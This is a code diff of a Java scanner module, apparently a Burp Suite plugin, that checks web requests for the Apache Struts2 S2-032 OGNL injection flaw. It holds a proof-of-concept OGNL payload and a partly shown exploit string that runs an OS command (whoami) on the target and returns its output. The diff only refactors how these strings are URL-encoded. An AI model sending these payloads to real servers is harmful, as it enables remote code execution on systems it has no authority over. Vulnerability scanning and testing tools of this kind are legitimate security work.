@@ -6,7 +6,8 @@ import java.net.URLEncoder;
 import java.util.Arrays;
 
 public class S2_032 extends IModule {
-    public String poc =
+    public S2_032() {
+        poc =
             "method:" +
             "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
             "#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
@@ -15,7 +16,9 @@ public class S2_032 extends IModule {
             "#w.flush()," +
             "#w.close()," +
             "1?#xx:#request.toString";
-    public String exp =
+        poc = URLEncoder.encode(poc);
+
+        exp =
             "method:" +
             "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
             "#res=@org.apache.struts2.ServletActionContext@getResponse()," +
@@ -25,11 +28,15 @@ public class S2_032 extends IModule {
             "#str=#s.hasNext()?#s.next():new java.lang.String(new byte[]{32})," +
             "#w.print(#str)," +
             "#w.close()," +
-            "1?#xx:#request.toString" +
-            "&pp=\\\\a" +
-            "&ppp= &" +
-            "encoding=UTF-8" +
-            "&cmd=whoami";
+            "1?#xx:#request.toString";
+        exp =
+            "pp=%5c%5ca" +
+            "&ppp=%20" +
+            "&encoding=UTF-8" +
+            "&cmd=whoami&" +
+            URLEncoder.encode(exp);
+
+    }
 
 
     @Override
@@ -38,11 +45,11 @@ public class S2_032 extends IModule {
         if (requestInfo.getMethod().equals("POST")) {
             in = (byte) 1;
         }
-        IParameter newParameter = helpers.buildParameter(URLEncoder.encode(poc), "1", in);
+        IParameter newParameter = helpers.buildParameter(poc, "1", in);
         request = helpers.updateParameter(request, newParameter);
 
         if (check()) {
-            this.detail = URLEncoder.encode(exp);
+            this.detail = exp;
             return creatCustomScanIssue();
         }
         return null;
